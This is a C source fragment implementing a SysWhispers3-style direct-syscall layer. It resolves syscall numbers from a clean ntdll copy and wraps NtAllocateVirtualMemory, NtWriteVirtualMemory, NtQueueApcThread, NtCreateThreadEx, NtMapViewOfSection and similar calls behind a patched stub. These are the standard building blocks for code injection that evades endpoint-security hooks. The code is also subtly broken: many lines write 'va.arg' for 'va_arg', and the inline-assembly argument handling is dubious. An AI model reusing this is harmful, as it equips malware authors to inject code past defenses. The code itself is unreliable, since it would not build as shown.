    if (!ExportDirectory) {
        LOG("SW3_PopulateSyscallList: Invalid export directory\n");
        return FALSE;
    }
    PDWORD Functions = (PDWORD)((PUCHAR)CleanNtdllBase + ExportDirectory->AddressOfFunctions);
    PDWORD Names = (PDWORD)((PUCHAR)CleanNtdllBase + ExportDirectory->AddressOfNames);
    PWORD Ordinals = (PWORD)((PUCHAR)CleanNtdllBase + ExportDirectory->AddressOfNameOrdinals);
    if (IsBadReadPtr(Functions, ExportDirectory->NumberOfFunctions * sizeof(DWORD)) ||
        IsBadReadPtr(Names, ExportDirectory->NumberOfNames * sizeof(DWORD)) ||
        IsBadReadPtr(Ordinals, ExportDirectory->NumberOfNames * sizeof(WORD))) {
        LOG("SW3_PopulateSyscallList: Invalid export table pointers\n");
        return FALSE;
    }
    DWORD entryIndex = 0;
    SW3_SYSCALL_ENTRY* Entries = SW3_SyscallList.Entries;
    for (DWORD i = 0; i < ExportDirectory->NumberOfNames; i++) {
        PCHAR FunctionName = (PCHAR)((PUCHAR)CleanNtdllBase + Names[i]);
        if (!FunctionName || IsBadReadPtr(FunctionName, 2)) continue;
        if (*(USHORT*)FunctionName == 0x775a) {
            char NtFunctionName[256];
            MyStrCat(NtFunctionName, sizeof(NtFunctionName), "Nt", FunctionName + 2);
            Entries[entryIndex].Hash = SW3_HashSyscall(NtFunctionName);
            Entries[entryIndex].Address = Functions[Ordinals[i]];
            Entries[entryIndex].SyscallAddress = NULL;
            entryIndex++;
            if (entryIndex == SW3_MAX_ENTRIES) break;
        }
    }
    SW3_SyscallList.Count = entryIndex;
    if (!entryIndex) {
        LOG("SW3_PopulateSyscallList: No syscall entries found\n");
        return FALSE;
    }
    for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++) {
        for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++) {
            if (Entries[j].Address > Entries[j + 1].Address) {
                SW3_SYSCALL_ENTRY TempEntry = Entries[j];
                Entries[j] = Entries[j + 1];
                Entries[j + 1] = TempEntry;
            }
        }
    }
    char buf[LOG_BUFFER_SIZE];
    snprintf(buf, sizeof(buf), "SW3_PopulateSyscallList: Populated %d syscall entries\n", entryIndex);
    LOG(buf);
    return TRUE;
}

BOOL SW3_GetSSN(DWORD FunctionHash, PDWORD Ssn) {
    if (!SW3_SyscallList.Count) return FALSE;
    for (DWORD i = 0; i < SW3_SyscallList.Count; i++) {
        if (FunctionHash == SW3_SyscallList.Entries[i].Hash) {
            *Ssn = i;
            return TRUE;
        }
    }
    return FALSE;
}

EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash) {
    DWORD ssn;
    return SW3_GetSSN(FunctionHash, &ssn) ? ssn : (DWORD)-1;
}

EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash) {
    return g_SyscallStub;
}

EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash) {
    return g_SyscallStub;
}

typedef NTSTATUS (NTAPI *SyscallFn)(void);

static NTSTATUS HandleNtAllocateVirtualMemory(SyscallFn win32Fallback, va_list ap) {
    HANDLE ProcessHandle = (HANDLE)va_arg(ap, ULONG_PTR);
    PVOID* BaseAddress = (PVOID*)va_arg(ap, ULONG_PTR);
    ULONG ZeroBits = va_arg(ap, ULONG);
    PSIZE_T RegionSize = (PSIZE_T)va_arg(ap, ULONG_PTR);
    ULONG AllocationType = va_arg(ap, ULONG);
    ULONG Protect = va_arg(ap, ULONG);
    #ifdef _M_IX86
    if (local_is_wow64()) {
        *BaseAddress = g_Win32ApiTable.pVirtualAlloc(*BaseAddress, *RegionSize, AllocationType, Protect);
        return *BaseAddress ? STATUS_SUCCESS : STATUS_NO_MEMORY;
    }
    #endif
    return ((NtAllocateVirtualMemory_t)win32Fallback)(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

static NTSTATUS HandleNtProtectVirtualMemory(SyscallFn win32Fallback, va_list ap) {
    HANDLE ProcessHandle = (HANDLE)va_arg(ap, ULONG_PTR);
    PVOID* BaseAddress = (PVOID*)va_arg(ap, ULONG_PTR);
    PSIZE_T RegionSize = (PSIZE_T)va.arg(ap, ULONG_PTR);
    ULONG NewProtect = va_arg(ap, ULONG);
    PULONG OldProtect = (PULONG)va.arg(ap, ULONG_PTR);
    #ifdef _M_IX86
    if (local_is_wow64()) {
        DWORD tempOldProtect;
        BOOL success = g_Win32ApiTable.pVirtualProtect(*BaseAddress, *RegionSize, NewProtect, &tempOldProtect);
        if (success) {
            *OldProtect = tempOldProtect;
            return STATUS_SUCCESS;
        }
        return STATUS_ACCESS_DENIED;
    }
    #endif
    return ((NtProtectVirtualMemory_t)win32Fallback)(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

static NTSTATUS HandleNtFreeVirtualMemory(SyscallFn win32Fallback, va_list ap) {
    HANDLE ProcessHandle = (HANDLE)va_arg(ap, ULONG_PTR);
    PVOID* BaseAddress = (PVOID*)va_arg(ap, ULONG_PTR);
    PSIZE_T RegionSize = (PSIZE_T)va.arg(ap, ULONG_PTR);
    ULONG FreeType = va.arg(ap, ULONG);
    return ((NtFreeVirtualMemory_t)win32Fallback)(ProcessHandle, BaseAddress, RegionSize, FreeType);
}

static NTSTATUS HandleNtWriteVirtualMemory(SyscallFn win32Fallback, va_list ap) {
    HANDLE ProcessHandle = (HANDLE)va_arg(ap, ULONG_PTR);
    PVOID BaseAddress = (PVOID)va_arg(ap, ULONG_PTR);
    PVOID Buffer = (PVOID)va.arg(ap, ULONG_PTR);
    SIZE_T NumberOfBytesToWrite = va_arg(ap, SIZE_T);
    PSIZE_T NumberOfBytesWritten = (PSIZE_T)va_arg(ap, ULONG_PTR);
    return ((NtWriteVirtualMemory_t)win32Fallback)(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

static NTSTATUS HandleNtQueueApcThread(SyscallFn win32Fallback, va_list ap) {
    HANDLE ThreadHandle = (HANDLE)va_arg(ap, ULONG_PTR);
    PKNORMAL_ROUTINE ApcRoutine = (PKNORMAL_ROUTINE)va.arg(ap, ULONG_PTR);
    PVOID NormalContext = (PVOID)va.arg(ap, ULONG_PTR);
    PVOID SystemArgument1 = (PVOID)va.arg(ap, ULONG_PTR);
    PVOID SystemArgument2 = (PVOID)va.arg(ap, ULONG_PTR);
    return ((NtQueueApcThread_t)win32Fallback)(ThreadHandle, ApcRoutine, NormalContext, SystemArgument1, SystemArgument2);
}

static NTSTATUS HandleNtCreateSection(SyscallFn win32Fallback, va_list ap) {
    PHANDLE SectionHandle = (PHANDLE)va.arg(ap, ULONG_PTR);
    ACCESS_MASK DesiredAccess = va_arg(ap, ULONG);
    PVOID ObjectAttributes = (PVOID)va.arg(ap, ULONG_PTR);
    PLARGE_INTEGER MaximumSize = (PLARGE_INTEGER)va.arg(ap, ULONG_PTR);
    ULONG SectionPageProtection = va.arg(ap, ULONG);
    ULONG AllocationAttributes = va.arg(ap, ULONG);
    HANDLE FileHandle = (HANDLE)va.arg(ap, ULONG_PTR);
    return ((NtCreateSection_t)win32Fallback)(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
}

static NTSTATUS HandleNtMapViewOfSection(SyscallFn win32Fallback, va_list ap) {
    HANDLE SectionHandle = (HANDLE)va.arg(ap, ULONG_PTR);
    HANDLE ProcessHandle = (HANDLE)va.arg(ap, ULONG_PTR);
    PVOID* BaseAddress = (PVOID*)va.arg(ap, ULONG_PTR);
    ULONG_PTR ZeroBits = va.arg(ap, ULONG_PTR);
    SIZE_T CommitSize = va.arg(ap, SIZE_T);
    PLARGE_INTEGER SectionOffset = (PLARGE_INTEGER)va.arg(ap, ULONG_PTR);
    PSIZE_T ViewSize = (PSIZE_T)va.arg(ap, ULONG_PTR);
    SECTION_INHERIT InheritDisposition = va.arg(ap, ULONG);
    ULONG AllocationType = va.arg(ap, ULONG);
    ULONG Win32Protect = va.arg(ap, ULONG);
    return ((NtMapViewOfSection_t)win32Fallback)(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
}

static NTSTATUS HandleNtUnmapViewOfSection(SyscallFn win32Fallback, va_list ap) {
    HANDLE ProcessHandle = (HANDLE)va.arg(ap, ULONG_PTR);
    PVOID BaseAddress = (PVOID)va.arg(ap, ULONG_PTR);
    return ((NtUnmapViewOfSection_t)win32Fallback)(ProcessHandle, BaseAddress);
}

static NTSTATUS HandleNtClose(SyscallFn win32Fallback, va_list ap) {
    HANDLE Handle = (HANDLE)va.arg(ap, ULONG_PTR);
    return ((NtClose_t)win32Fallback)(Handle);
}

static NTSTATUS HandleNtDuplicateObject(SyscallFn win32Fallback, va_list ap) {
    HANDLE SourceProcessHandle = (HANDLE)va.arg(ap, ULONG_PTR);
    HANDLE SourceHandle = (HANDLE)va.arg(ap, ULONG_PTR);
    HANDLE TargetProcessHandle = (HANDLE)va.arg(ap, ULONG_PTR);
    PHANDLE TargetHandle = (PHANDLE)va.arg(ap, ULONG_PTR);
    ACCESS_MASK DesiredAccess = va.arg(ap, ULONG);
    ULONG HandleAttributes = va.arg(ap, ULONG);
    ULONG Options = va.arg(ap, ULONG);
    return ((NtDuplicateObject_t)win32Fallback)(SourceProcessHandle, SourceHandle, TargetProcessHandle, TargetHandle, DesiredAccess, HandleAttributes, Options);
}

static NTSTATUS HandleNtQueryInformationProcess(SyscallFn win32Fallback, va_list ap) {
    HANDLE ProcessHandle = (HANDLE)va.arg(ap, ULONG_PTR);
    PROCESSINFOCLASS ProcessInformationClass = va.arg(ap, ULONG);
    PVOID ProcessInformation = (PVOID)va.arg(ap, ULONG_PTR);
    ULONG ProcessInformationLength = va.arg(ap, ULONG);
    PULONG ReturnLength = (PULONG)va.arg(ap, ULONG_PTR);
    return ((NtQueryInformationProcess_t)win32Fallback)(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
}

static NTSTATUS HandleNtCreateThreadEx(SyscallFn win32Fallback, va_list ap) {
    PHANDLE ThreadHandle = (PHANDLE)va.arg(ap, ULONG_PTR);
    ACCESS_MASK DesiredAccess = va.arg(ap, ULONG);
    PVOID ObjectAttributes = (PVOID)va.arg(ap, ULONG_PTR);
    HANDLE ProcessHandle = (HANDLE)va.arg(ap, ULONG_PTR);
    PVOID StartRoutine = (PVOID)va.arg(ap, ULONG_PTR);
    PVOID Argument = (PVOID)va.arg(ap, ULONG_PTR);
    ULONG CreateFlags = va.arg(ap, ULONG);
    ULONG_PTR ZeroBits = va.arg(ap, ULONG_PTR);
    SIZE_T StackSize = va.arg(ap, SIZE_T);
    SIZE_T MaximumStackSize = va.arg(ap, SIZE_T);
    PVOID AttributeList = (PVOID)va.arg(ap, ULONG_PTR);
    return ((NtCreateThreadEx_t)win32Fallback)(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

static NTSTATUS HandleNtResumeThread(SyscallFn win32Fallback, va_list ap) {
    HANDLE ThreadHandle = (HANDLE)va.arg(ap, ULONG_PTR);
    PULONG PreviousSuspendCount = (PULONG)va.arg(ap, ULONG_PTR);
    return ((NtResumeThread_t)win32Fallback)(ThreadHandle, PreviousSuspendCount);
}

static NTSTATUS NTAPI GenericNtCall(
    DWORD hash,
    SyscallFn win32Fallback,
    PVOID stubAddr,
    int numArgs,
    ...) {
    if (win32Fallback) {
        va_list ap;
        va_start(ap, numArgs);
        NTSTATUS st = STATUS_INVALID_PARAM;
        if (hash == SW3_HashSyscall("NtAllocateVirtualMemory") && numArgs == 6) {
            st = HandleNtAllocateVirtualMemory(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtProtectVirtualMemory") && numArgs == 5) {
            st = HandleNtProtectVirtualMemory(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtFreeVirtualMemory") && numArgs == 4) {
            st = HandleNtFreeVirtualMemory(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtWriteVirtualMemory") && numArgs == 5) {
            st = HandleNtWriteVirtualMemory(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtQueueApcThread") && numArgs == 5) {
            st = HandleNtQueueApcThread(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtCreateSection") && numArgs == 7) {
            st = HandleNtCreateSection(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtMapViewOfSection") && numArgs == 10) {
            st = HandleNtMapViewOfSection(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtUnmapViewOfSection") && numArgs == 2) {
            st = HandleNtUnmapViewOfSection(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtClose") && numArgs == 1) {
            st = HandleNtClose(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtDuplicateObject") && numArgs == 7) {
            st = HandleNtDuplicateObject(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtQueryInformationProcess") && numArgs == 5) {
            st = HandleNtQueryInformationProcess(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtCreateThreadEx") && numArgs == 11) {
            st = HandleNtCreateThreadEx(win32Fallback, ap);
        }
        else if (hash == SW3_HashSyscall("NtResumeThread") && numArgs == 2) {
            st = HandleNtResumeThread(win32Fallback, ap);
        }
        va_end(ap);
        return st;
    }
    LOG("GenericNtCall: win32Fallback is NULL, attempting syscall\n");
    DWORD ssn;
    if (!SW3_GetSSN(hash, &ssn)) {
        LOG("GenericNtCall: Syscall number not found\n");
        return STATUS_NOT_FOUND;
    }
    if (!stubAddr) {
        LOG("GenericNtCall: Syscall stub not initialized\n");
        return STATUS_NOT_FOUND;
    }
    *(DWORD*)((PUCHAR)stubAddr + 1) = ssn;
    va_list ap;
    va_start(ap, numArgs);
    NTSTATUS status;
    __try {
        DWORD originalEsp, alignedEsp;
        __asm {
            mov eax, esp
            mov originalEsp, eax
            and esp, 0xFFFFFFF0
            mov alignedEsp, esp
        }
        void* args[11];
        for (int i = 0; i < numArgs && i < 11; i++) {
            args[i] = (void*)va.arg(ap, ULONG_PTR);
        }
        for (int i = numArgs - 1; i >= 0; i--) {
            __asm {
                push args[i]
            }
        }
        __asm {
            call stubAddr
            mov status, eax
            mov esp, originalEsp
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        LOG("GenericNtCall: Exception in syscall execution\n");
        status = STATUS_UNSUCCESSFUL;
    }
    va_end(ap);
    return status;
}

#define DEFINE_NT_WRAPPER(name, hash, fallback, numArgs, sig, args) \
    EXTERN_C NTSTATUS NTAPI name sig { \
        return GenericNtCall(hash, (SyscallFn)g_NtFunctions.fallback, g_SyscallStub, numArgs, args); \
    }
NT_SYSCALL_LIST(DEFINE_NT_WRAPPER)